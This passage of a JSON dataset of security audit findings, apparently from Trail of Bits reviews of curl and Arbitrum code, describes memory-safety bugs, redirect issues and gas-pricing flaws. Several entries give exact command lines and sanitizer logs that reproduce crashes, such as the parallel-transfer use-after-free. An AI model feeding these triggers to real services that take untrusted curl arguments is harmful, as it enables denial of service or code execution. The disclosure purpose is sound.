curl/src/tool_operate.c:2620:16 #11 0x4dee35 in operate curl/src/tool_operate.c:2732:18 #12 0x4dcf73 in main curl/src/tool_main.c:276:14 #13 0x7f1eee2af082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 SUMMARY: AddressSanitizer: double-free (curl/src/.libs/curl+0x494c8d) in free Figure 7.1: Reproducing double free vulnerability with ASAN log 158 static CURLcode connect_init ( struct Curl_easy *data, bool reinit) // (...) 174 s = calloc( 1 , sizeof ( struct http_connect_state )); Figure 7.2: Allocating a block of memory that is freed twice ( curl/lib/http_proxy.c#158174 ) 787 static void conn_free ( struct connectdata *conn) // (...) 814 Curl_safefree(conn->connect_state); Figure 7.3: The conn_free function that frees the http_connect_state struct for HTTP CONNECT ( curl/lib/url.c#787814 ) void Curl_free_request_state ( struct Curl_easy *data) 2257 2258 { 2259 2260 Curl_safefree(data->req.p.http); Curl_safefree(data->req.newurl); Figure 7.4: The Curl_free_request_state function that frees elements in the Curl_easy struct, which leads to a double free vulnerability ( curl/lib/url.c#22572260 ) Exploit Scenario An attacker nds a way to exploit the double free vulnerability described in this nding either in cURL or in a program that uses libcurl and gets remote code execution on the machine from which the cURL code was executed. Recommendations Short term, x the double free vulnerability described in this nding. Long term, expand cURLs unit tests and fuzz tests to cover dierent types of proxies for supported protocols. Also, extend the fuzzing strategy to cover argv fuzzing. It can be obtained using the approach presented in the argv-fuzz-inl.h from the AFL++ project. This will force the fuzzer to build an argv pointer array (which points to arguments passed to the cURL) from NULL-delimited standard input. Finally, consider adding a dictionary with possible options and protocols to the fuzzer based on the source code or on cURLs manual.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Some ags override previous instances of themselves ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "body": "Some cURL ags, when provided multiple times, overrides themselves and eectively use the last ag provided. If a ag makes cURL invocations security options more strict, then accidental overwriting may weaken the desired security. The identied ag with this property is the --crlfile command-line option. It allows users to pass a PEM-formatted certicate revocation list to cURL. --crlfile <file> List that may specify peer certificates that are to be considered revoked. (TLS) Provide a file using PEM format with a Certificate Revocation If this option is used several times, the last one will be used. Example: curl --crlfile rejects.txt https://example.com Added in 7.19.7. Figure 8.1: The description of the --crlfile option Exploit Scenario A user wishes for cURL to reject certicates specied across multiple certicate revocation lists. He unwittingly uses the --crlfile ag multiple times, dropping all but the last-specied list. Requests the user sends with cURL are intercepted by a Man-in-the-Middle attacker, who uses a known-compromised certicate to bypass TLS protections. Recommendations Short term, change the behavior of --crlfile to append new certicates to the revocation list, not to replace those specied earlier. If backwards compatibility prevents this, have cURL issue a warning such as  --crlfile specified multiple times, using only <filename.txt> . Long term, ensure that behavior, such as how multiple instances of a command-line argument are handled, is consistent throughout the application. Issue a warning when a security-relevant ag is provided multiple times.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Cookies are not stripped after redirect ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "body": "If cookies are passed to cURL via the --cookie ag, they will not be stripped if the target responds with a redirect. RFC 9110 section 15.4, Redirection 3xx , does not specify whether or not cookies should be stripped during a redirect; as such, it may be better to err on the side of caution and strip them by default if the origin changed. The recommended behavior would match the current behavior with cookie jar (i.e., when a server sets a new cookie and requests a redirect) and Authorization header (which is stripped on cross-origin redirects). Recommendations Short term, if backwards compatibility would not prohibit such a change, strip cookies upon a redirect to a dierent origin by default and provide a command-line ag that enables the previous behavior (or extend the --location-trusted ag). Long term, in cases where a specication is ambiguous and practicality allows, always default to the most secure possible interpretation. Extend tests to check for behavior of passing data after redirection.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Use after free while using parallel option and sequences ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "body": "Using cURL with parallel option ( -Z ), two consecutive sequences (that end up creating 51 hosts), and an unmatched bracket triggers a use-after-free vulnerability (gure 10.1). The add_parallel_transfers function allocates memory blocks for an error buer; consequently, by default, it allows up to 50 transfers (gure 10.2, line 2228). Then, in the Curl_failf function, it copies errors (e.g., Could not resolve host: q{ ) to appropriate error buers when connections fail (gure 10.3) and frees the memory. For the last sequence ( u~ host), it allocates a memory buer (gure 10.2), frees a buer (gure 10.3), and copies an error ( Could not resolve host: u~ ) to the previously freed memory buer (gure 10.4). $ curl 0 -Z [q-u][u-~] } curl: (7) Failed to connect to 0.0.0.0 port 80 after 0 ms: Connection refused curl: (3) unmatched close brace/bracket in URL position 1: } ^ curl: (6) Could not resolve host: q{ curl: (6) Could not resolve host: q| curl: (6) Could not resolve host: q} curl: (6) Could not resolve host: q~ curl: (6) Could not resolve host: r{ curl: (6) Could not resolve host: r| curl: (6) Could not resolve host: r} curl: (6) Could not resolve host: r~ curl: (6) Could not resolve host: s{ curl: (6) Could not resolve host: s| curl: (6) Could not resolve host: s} curl: (6) Could not resolve host: s~ curl: (6) Could not resolve host: t{ curl: (6) Could not resolve host: t| curl: (6) Could not resolve host: t} curl: (6) Could not resolve host: t~ curl: (6) Could not resolve host: u{ curl: (6) Could not resolve host: u| curl: (6) Could not resolve host: u} curl: (3) unmatched close brace/bracket in URL position 1: } ^ ====2789144==ERROR: AddressSanitizer: heap-use-after-free on address 0x611000004780 at pc 0x7f9b5f94016d bp 0x7fff12d4dbc0 sp 0x7fff12d4d368 WRITE of size #0 0x7f9b5f94016c in __interceptor_strcpy ../../../../src/libsanitizer/asan/asan_interceptors. cc : 431 #1 0x7f9b5f7ce6f4 in strcpy /usr/ include /x86_64-linux-gnu/bits/string_fortified. h : 90 #2 0x7f9b5f7ce6f4 in Curl_failf /home/scooby/curl/lib/sendf. c : 275 #3 0x7f9b5f78309a in Curl_resolver_error /home/scooby/curl/lib/hostip. c : 1316 #4 0x7f9b5f73cb6f in Curl_resolver_is_resolved /home/scooby/curl/lib/asyn-thread. c : 596 #5 0x7f9b5f7bc77c in multi_runsingle /home/scooby/curl/lib/multi. c : 1979 #6 0x7f9b5f7bf00f in curl_multi_perform /home/scooby/curl/lib/multi. c : 2684 #7 0x55d812f7609e in parallel_transfers /home/scooby/curl/src/tool_operate. c : 2308 #8 0x55d812f7609e in run_all_transfers /home/scooby/curl/src/tool_operate. c : 2618 #9 0x55d812f7609e in operate /home/scooby/curl/src/tool_operate. c : 2732 #10 0x55d812f4ffa8 in main /home/scooby/curl/src/tool_main. c : 276 #11 0x7f9b5f1aa082 in __libc_start_main ../csu/libc- start . c : 308 #12 0x55d812f506cd in _start (/usr/ local /bin/curl+ 0x316cd ) 0x611000004780 is located 0 bytes inside of 256-byte region [0x611000004780,0x611000004880) freed by thread T0 here: #0 0x7f9b5f9b140f in __interceptor_free ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:122 #1 0x55d812f75682 in add_parallel_transfers /home/scooby/curl/src/tool_operate.c:2251 previously allocated by thread T0 here: #0 0x7f9b5f9b1808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144 #1 0x55d812f75589 in add_parallel_transfers /home/scooby/curl/src/tool_operate.c:2228 SUMMARY: AddressSanitizer: heap-use-after-free ../../../../src/libsanitizer/asan/asan_interceptors.cc:431 in __interceptor_strcpy Shadow bytes around the buggy address: 0x0c227fff88a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff88b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff88c0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c227fff88d0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff88e0: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa =>0x0c227fff88f0:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff8900: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff8910: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c227fff8920: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff8930: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa 0x0c227fff8940: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Heap left redzone: fa Freed heap region: fd ==2789144==ABORTING Figure 10.1: Reproducing use-after-free vulnerability with ASAN log 2192 static CURLcode add_parallel_transfers ( struct GlobalConfig *global, CURLM *multi, CURLSH *share, bool *morep, bool *addedp) 2197 { // (...) 2210 for (per = transfers; per && (all_added < global->parallel_max); per = per->next) { 2227 2228 // (...) 2249 if (!errorbuf) { errorbuf = malloc(CURL_ERROR_SIZE); result = create_transfer(global, share, &getadded); 2250 2251 2252 2253 if (result) { free(errorbuf); return result; } Figure 10.2: The add_parallel_transfers function ( curl/src/tool_operate.c#21922253 ) 264 265 { void Curl_failf ( struct Curl_easy *data, const char *fmt, ...) // (...) 275 strcpy(data->set.errorbuffer, error); Figure 10.3: The Curl_failf function that copies appropriate error to the error buer ( curl/lib/sendf.c#264275 ) Exploit Scenario An administrator sets up a service that calls cURL, where some of the cURL command-line arguments are provided from external, untrusted input. An attacker manipulates the input to exploit the use-after-free bug to run arbitrary code on the machine that runs cURL. Recommendations Short term, x the use-after-free vulnerability described in this nding. Long term, extend the fuzzing strategy to cover argv fuzzing. It can be obtained using the argv-fuzz-inl.h from the AFL++ project to build argv from stdin in the cURL. Also, consider adding a dictionary with possible options and protocols to the fuzzer based on the source code or cURLs manual.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Unused memory blocks are not freed resulting in memory leaks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "body": "For specic commands (gure 11.1, 11.2, 11.3), cURL allocates blocks of memory that are not freed when they are no longer needed, leading to memory leaks. $ curl 0 -Z 0 -Tz 0 curl: Can 't open ' z '! curl: try ' curl --help ' or ' curl --manual' for more information curl: ( 26 ) Failed to open/read local data from file/application ============= 2798000 ==ERROR: LeakSanitizer: detected memory leaks Direct leak of 4848 byte(s) in 1 object(s) allocated from: #0 0x7f868e6eba06 in __interceptor_calloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:153 #1 0x561bb1d1dc9f in glob_url /home/scooby/curl/src/tool_urlglob.c:459 Indirect leak of 8 byte(s) in 1 object(s) allocated from: #0 0x7f868e6eb808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144 #1 0x561bb1d1e06c in glob_fixed /home/scooby/curl/src/tool_urlglob.c:48 #2 0x561bb1d1e06c in glob_parse /home/scooby/curl/src/tool_urlglob.c:411 #3 0x561bb1d1e06c in glob_url /home/scooby/curl/src/tool_urlglob.c:467 Indirect leak of 2 byte(s) in 1 object(s) allocated from: #0 0x7f868e6eb808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144 #1 0x561bb1d1e0b0 in glob_fixed /home/scooby/curl/src/tool_urlglob.c:53 #2 0x561bb1d1e0b0 in glob_parse /home/scooby/curl/src/tool_urlglob.c:411 #3 0x561bb1d1e0b0 in glob_url /home/scooby/curl/src/tool_urlglob.c:467 Indirect leak of 2 byte(s) in 1 object(s) allocated from: #0 0x7f868e6eb808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144 #1 0x561bb1d1dc6a in glob_url /home/scooby/curl/src/tool_urlglob.c:454 Figure 11.1: Reproducing memory leaks vulnerability in the tool_urlglob.c le with LeakSanitizer log. $ curl 00 --cu 00 curl: ( 7 ) Failed to connect to 0 .0.0.0 port 80 after 0 ms: Connection refused ============= 2798691 ==ERROR: LeakSanitizer: detected memory leaks Direct leak of 3 byte(s) in 1 object(s) allocated from: #0 0x7fbc6811b3ed in __interceptor_strdup ../../../../src/libsanitizer/asan/asan_interceptors.cc:445 #1 0x56412ed047ee in getparameter /home/scooby/curl/src/tool_getparam.c:1885 SUMMARY: AddressSanitizer: 3 byte(s) leaked in 1 allocation(s). Figure 11.2: Reproducing a memory leak vulnerability in the tool_getparam.c le with LeakSanitizer log $ curl --proto = 0 --proto = 0 Warning: unrecognized protocol '0' Warning: unrecognized protocol '0' curl: no URL specified! curl: try 'curl --help' or 'curl --manual' for more information ================================================================= == 2799783 ==ERROR: LeakSanitizer: detected memory leaks Direct leak of 1 byte(s) in 1 object(s) allocated from: #0 0x7f90391803ed in __interceptor_strdup ../../../../src/libsanitizer/asan/asan_interceptors.cc:445 #1 0x55e405955ab7 in proto2num /home/scooby/curl/src/tool_paramhlp.c:385 SUMMARY: AddressSanitizer: 1 byte(s) leaked in 1 allocation(s). Figure 11.3: Reproducing a memory leak vulnerability in the tool_paramhlp.c le with LeakSanitizer log Exploit Scenario An attacker nds a way to allocate extensive lots of memory on the local machine, which leads to the overconsumption of resources and a denial-of-service attack. Recommendations Short term, x memory leaks described in this nding by freeing memory blocks that are no longer needed. Long term, extend the fuzzing strategy to cover argv fuzzing. It can be obtained using the argv-fuzz-inl.h from the AFL++ project to build argv from stdin in the cURL. Also, consider adding a dictionary with possible options and protocols to the fuzzer based on the source code or cURLs manual.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Referer header is generated in insecure manner ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "body": "The cURL automatically sets the referer header for HTTP redirects when provided with the --referer ;auto ag. The header set contains the entire original URL except for the user-password fragment. The URL includes query parameters, which is against current best practices for handling the referer , which say to default to the strict-origin-when-cross-origin option. The option instructs clients to send only the URLs origin for cross-origin redirect, and not to send the header to less secure destinations (e.g., when redirecting from HTTPS to HTTP protocol). Exploit Scenario An user uses cURL to send a request to a server that requires multi-step authorization. He provides the authorization token as a query parameter and enables redirects with --location ag. Because of the server misconguration, a 302 redirect response with an incorrect Location header that points to a third-party domain is sent back to the cURL. The cURL requests the third-party domain, leaking the authorization token via the referer header. Recommendations Short term, send only the origin instead of the whole URL on cross-origin requests in the referer header. Consider not sending the header on redirects downgrading the security level. Additionally, consider implementing support for the Referrer-Policy response header. Alternatively, introduce a new ag that would allow users to set the desired referrer policy manually. Long term, review response headers that change behavior of HTTP redirects and ensure either that they are supported by the cURL or that secure defaults are implemented. References  Feature: Referrer Policy: Default to strict-origin-when-cross-origin",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Redirect to localhost and local network is possible (Server-side request forgery like) ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "body": "When redirects are enabled with cURL (i.e., the --location ag is provided), then a server may redirect a request to an arbitrary endpoint, and the cURL will issue a request to it. This gives requested servers partial access to cURLs users local networks. The issue is similar to the Server-Side Request Forgery (SSRF) attack vector, but in the context of the client application. Exploit Scenario An user sends a request using cURL to a malicious server using the --location ag. The server responds with a 302 redirect to http://192.168.0.1:1080?malicious=data endpoint, accessing the user's router admin panel. Recommendations Short term, add a warning about this attack vector in the --location ag documentation. Long term, consider disallowing redirects to private networks and loopback interface by either introducing a new ag that would disable the restriction or extending the --location-trusted ag functionality.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. URL parsing from redirect is incorrect when no path separator is provided ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "body": "When cURL parses a URL from the Location header for an HTTP redirect and the URL does not contain a path separator (/), the cURL incorrectly duplicates query strings (i.e., data after the question mark) and fragments (data after cross). The cURL correctly parses similar URLs when they are provided directly in the command line. This behavior indicates that dierent parsers are used for direct URLs and URLs from redirects, which may lead to further bugs. $ curl -v -L 'http://local.test?redirect=http://local.test:80?-123' * Trying 127 .0.0.1:80... * Connected to local.test ( 127 .0.0.1) port 80 ( #0) > GET /?redirect=http://local.test:80?-123 HTTP/1.1 > Host: local.test > User-Agent: curl/7.86.0-DEV > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 302 Found < Location: http://local.test:80?-123 < Date: Mon, 10 Oct 2022 14 :53:46 GMT < Connection: keep-alive < Keep-Alive: timeout = 5 < Transfer-Encoding: chunked < * Ignoring the response-body * Connection #0 to host local.test left intact * Issue another request to this URL: 'http://local.test:80/?-123?-123' * Found bundle for host: 0x6000039287b0 [serially] * Re-using existing connection #0 with host local.test * Connected to local.test ( 127 .0.0.1) port 80 ( #0) > GET /?-123?-123 HTTP/1.1 > Host: local.test > User-Agent: curl/7.86.0-DEV > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 200 OK < Date: Mon, 10 Oct 2022 14 :53: < Connection: keep-alive < Keep-Alive: timeout = 5 < Content-Length: 16 < * Connection #0 to host local.test left intact HTTP Connection! Figure 14.1: Example logging output from cURL, presenting the bug in parsing URLs from the Location header, with port and query parameters $ curl -v -L 'http://local.test?redirect=http://local.test%23-123' * Trying 127 .0.0.1:80... * Connected to local.test ( 127 .0.0.1) port 80 ( #0) > GET /?redirect=http://local.test%23-123 HTTP/1.1 > Host: local.test > User-Agent: curl/7.86.0-DEV > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 302 Found < Location: http://local.test#-123 < Date: Mon, 10 Oct 2022 14 :56:05 GMT < Connection: keep-alive < Keep-Alive: timeout = 5 < Transfer-Encoding: chunked < * Ignoring the response-body * Connection #0 to host local.test left intact * Issue another request to this URL: 'http://local.test/#-123#-123' * Found bundle for host: 0x6000003f47b0 [serially] * Re-using existing connection #0 with host local.test * Connected to local.test ( 127 .0.0.1) port 80 ( #0) > GET / HTTP/1.1 > Host: local.test > User-Agent: curl/7.86.0-DEV > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 200 OK < Date: Mon, 10 Oct 2022 14 :56:05 GMT < Connection: keep-alive < Keep-Alive: timeout = 5 < Content-Length: 16 < * Connection #0 to host local.test left intact HTTP Connection! Figure 14.2: Example logging output from cURL, presenting the bug in parsing URLs from Location header, without port and with fragment Exploit Scenario A user of cURL accesses data from a server. The server redirects cURL to another endpoint. cURL incorrectly duplicates the query string in the new request. The other endpoint uses the incorrect data, which negatively aects the user. Recommendations Short term, x the parsing bug in the Location header parser. Long term, use a single, centralized API for URL parsing in the whole cURL codebase. Expand tests with checks of parsing of redirect responses.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. routeToken function may fail for certain ERC20 tokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-offchain-labs-bold-dac-rewards-updates-securityreview.pdf",
        "body": "The routeToken function can revert for ERC20 tokens that require the allowance to be set to 0 when calling the approve function, such as USDT. The function has an optimization where it approves amount + 1 to the gateway, which will transfer the amount of tokens in a following call. The idea is to never change the allowance storage slot from a non-zero to a zero value and saving gas. However, tokens such as USDT require the current allowance to be 0 when a user calls the approve function; in this case, this makes the routeToken function revert. function routeToken(address parentChainTokenAddr, uint256 maxSubmissionCost, uint256 gasLimit, uint256 maxFeePerGas) public payable { ... // approve amount on gateway, adding 1 so storage slot doesn't get set to 0, saving gas. IERC20(parentChainTokenAddr).approve(gateway, amount + 1); ... } Figure 1.1: Snippet of the routeToken function (src/FeeRouter/ParentToChildRewardRouter.sol#L162-L163) Exploit Scenario The ParentToChildRewardRouter contract is deployed with parentChainTokenAddr set to the USDT address. A user calls the routeToken function, but it unexpectedly reverts. Recommendations Short term, remove this optimization or use the forceApprove function in the SafeERC20 library after verifying that this function would still save gas. Long term, when developing a contract that interacts with ERC20 tokens, consider all possible dierent implementations and which implementations your contract should support. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Discrepancy in comment about upgrade action ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-offchainarbitrum-securityreview.pdf",
        "body": "The upgrade action to set the sequencer inbox maximum time variation contains an incorrect comment. SetSequencerInboxMaxTimeVariationAction( ISequencerInboxGetter(0xd514C2b3aaBDBfa10800B9C96dc1eB25427520A0), // Arb One Address Registry 5760, // Delay blocks (same as current value) 64, // New future blocks value 86_400, // Delay seconds (same as current value) 768 // New future seconds value (delay blocks * 12) ) Figure 1.1: Sequencer upgrade action (AIPSetSequencerInboxMaxTimeVariationArbOneAction.sol#1319) The comment for the new future seconds value (768) should read (future blocks * 12) instead of (delay blocks * 12). Recommendations Short term, correct the comment in the upgrade action for both upgrade actions in Arbitrum One and Arbitrum Nova. 2. Unresolved TODO comments in NomineeGovernorV2UpgradeActionTemplate Severity: Informational Diculty: Medium Type: Undened Behavior Finding ID: TOB-ARB-SCE-2 Target: src/gov-action-contracts/AIPs/NomineeGovernorV2 UpgradeAction.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Discrepancy in comment about upgrade action ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-offchainarbitrum-securityreview.pdf",
        "body": "The upgrade action to set the sequencer inbox maximum time variation contains an incorrect comment. SetSequencerInboxMaxTimeVariationAction( ISequencerInboxGetter(0xd514C2b3aaBDBfa10800B9C96dc1eB25427520A0), // Arb One Address Registry 5760, // Delay blocks (same as current value) 64, // New future blocks value 86_400, // Delay seconds (same as current value) 768 // New future seconds value (delay blocks * 12) ) Figure 1.1: Sequencer upgrade action (AIPSetSequencerInboxMaxTimeVariationArbOneAction.sol#1319) The comment for the new future seconds value (768) should read (future blocks * 12) instead of (delay blocks * 12). Recommendations Short term, correct the comment in the upgrade action for both upgrade actions in Arbitrum One and Arbitrum Nova.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Unresolved TODO comments in NomineeGovernorV2UpgradeActionTemplate ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-offchainarbitrum-securityreview.pdf",
        "body": "The NomineeGovernorV2 upgrade action contains unresolved TODO comments that need to be addressed before a nal deployment and upgrade are possible. constructor() NomineeGovernorV2UpgradeActionTemplate( 0xdb216562328215E010F819B5aBe947bad4ca961e, 0x8a1cDA8dee421cD06023470608605934c16A05a0, address(0), // todo: new implementation 50400, 0x1D62fFeB72e4c360CcBbacf7c965153b00260417, 0x0101010101010101010101010101010101010101010101010101010101010101 // todo: new constitution hash ) {} Figure 2.1: NomineeGovernorV2 upgrade action (NomineeGovernorV2UpgradeAction.sol) Recommendations Short term, deploy the implementation contract, set the address in the constructor, and include the correct constitution hash.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Unnecessary duplication in inheritance ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-offchainarbitrum-securityreview.pdf",
        "body": "The governance codebase contains several instances of duplicate inheritancea child contract inherits from a contract already in the inheritance tree of its parent. This may be necessary to control the C3 linearization of a contracts inheritance tree (but designs requiring this should generally be avoided). Since the following instances of redundant inheritance pertain only to virtual functions that are not overridden multiple times, the contracts that are repeatedly inherited can be removed (see appendix B). Inheritance duplication in L1ArbitrumToken: Initializable (already inherited by ERC20Upgradeable) Inheritance duplication in L1ArbitrumToken: ERC20Upgradeable (already inherited by ERC20PermitUpgradeable) Inheritance duplication in L2ArbitrumGovernor: Initializable (already inherited by GovernorSettingsUpgradeable) Inheritance duplication in L2ArbitrumGovernor: GovernorVotesUpgradeable (already inherited by GovernorVotesQuorumFractionUpgradeable) Inheritance duplication in L2ArbitrumToken: Initializable (already inherited by ERC20Upgradeable) Inheritance duplication in L2ArbitrumToken: ERC20Upgradeable (already inherited by ERC20BurnableUpgradeable) Inheritance duplication in L2ArbitrumToken: ERC20PermitUpgradeable (already inherited by ERC20VotesUpgradeable) Inheritance duplication in UpgradeExecutor: Initializable (already inherited by AccessControlUpgradeable) Inheritance duplication in SecurityCouncilManager: Initializable (already inherited by AccessControlUpgradeable) Inheritance duplication in SecurityCouncilMemberElectionGovernor: Initializable (already inherited by GovernorUpgradeable) Inheritance duplication in SecurityCouncilMemberElectionGovernor: GovernorUpgradeable (already inherited by GovernorVotesUpgradeable) Inheritance duplication in SecurityCouncilMemberRemovalGovernor: Initializable (already inherited by GovernorUpgradeable) Inheritance duplication in SecurityCouncilMemberRemovalGovernor: GovernorUpgradeable (already inherited by GovernorVotesUpgradeable) Inheritance duplication in SecurityCouncilMemberRemovalGovernor: GovernorVotesUpgradeable (already inherited by ArbitrumGovernorVotesQuorumFractionUpgradeable) Inheritance duplication in SecurityCouncilNomineeElectionGovernor: Initializable (already inherited by GovernorUpgradeable) Inheritance duplication in SecurityCouncilNomineeElectionGovernor: GovernorUpgradeable (already inherited by GovernorVotesUpgradeable) Inheritance duplication in SecurityCouncilNomineeElectionGovernor: GovernorVotesUpgradeable (already inherited by ArbitrumGovernorVotesQuorumFractionUpgradeable) Figure 3.1: Terminal output from script in appendix B Recommendations Short term, remove redundant inheritance and thoroughly test for regressions in the storage layout of upgradeable contracts. Long term, set and enforce coding standards pertaining to inheritance to avoid complexity and make future maintenance less burdensome. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Gas for WASM program activation not charged early enough ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The gas for activating WASM programs is not charged early enough in the activation code to prevent denial-of-service attacks. WASM activation is a computationally expensive operation that involves decompressing bytecode (gure 1.1). func (p Programs) ActivateProgram(evm *vm.EVM, program common.Address, debugMode bool) (uint16, bool, error) { statedb := evm.StateDB codeHash := statedb.GetCodeHash(program) version, err := p.StylusVersion() if err != nil { return 0, false, err } latest, err := p.CodehashVersion(codeHash) if err != nil { return 0, false, err } // Already compiled and found in the machine versions mapping. if latest >= version { return 0, false, ProgramUpToDateError() } wasm, err := getWasm(statedb, program) if err != nil { return 0, false, err } {...omitted for brevity...} } func getWasm(statedb vm.StateDB, program common.Address) ([]byte, error) { {...omitted for brevity...} return arbcompress.Decompress(wasm, MaxWasmSize) } Figure 1.1: WASM program activationrelated code in arbos/programs/programs.go#L84 and #L233 However, if Brotlis decompression fails, the user will not be charged for activating the program, which can be expensive. Exploit Scenario Eve creates a specially crafted compressed WASM bytecode with a corrupted bit at the end, with the purpose of slowing down the Arbitrum chain. The corrupted bit causes a failure during decompression, allowing her to avoid paying full price for her program, making her attack cheaper than expected. Recommendations Short term, charge gas as early as possible during WASM program activation; gas should be charged even if activation fails for any reason. Long term, review each computationally expensive operation that can be arbitrarily triggered by users to ensure it is properly priced.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Project contains no build instructions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The Stylus repository contains information regarding the project, a roadmap, and information regarding gas pricing, but it lacks other essential information. The repositorys README should include at least the following:  Instructions for building the project  Instructions for running the built artifacts  Instructions for running the projects tests Note that the repository contains a makele with convenient scripts; however, repositories of this size (e.g., involving a lot of dependencies and Git submodules) are often dicult to build even for experienced developers. Therefore, having building instructions and solutions to common build problems would greatly speed up developer onboarding. Exploit Scenario Alice, a developer, tries to build the Stylus repository; however, she faces problems building it due to the missing documentation in the README, and she makes a mistake in the procedure that causes the build to fail. Recommendations Short term, add the minimum information listed above to the repositorys README. This will help developers to build, run, and test the project. Long term, as the project evolves, ensure that the README is updated. This will help ensure that it does not communicate incorrect information to users.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. WASM Merkleization is computationally expensive ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "A WASM binary with a large global table (e.g., (table (;0;) 1000000 1000000 externref)) will require a few seconds of computation to iterate over and hash all table elements (gure 3.1). // Merkleize things if requested for module in &mut modules { for table in module.tables.iter_mut() { table.elems_merkle = Merkle::new( MerkleType::TableElement, table.elems.iter().map(TableElement::hash).collect(), ); } let tables_hashes: Result<_, _> = module.tables.iter().map(Table::hash).collect(); module.tables_merkle = Merkle::new(MerkleType::Table, tables_hashes?); if always_merkleize { module.memory.cache_merkle_tree(); } } Figure 3.1: A Merkle tree of all table elements being generated (arbitrator/prover/src/machine.rs#L1395-L1410) Exploit Scenario Eve creates a specially crafted WASM binary containing huge global tables, slowing down the chain. Recommendations Short term, reduce the number of table elements that a global table can have to speed up the module parsing process. Consider charging ink for this computation based on the number of elements hashed. Long term, review each computationally expensive operation that can be arbitrarily triggered by users to ensure it is properly priced.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. WASM binaries lack memory protections against corruption ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
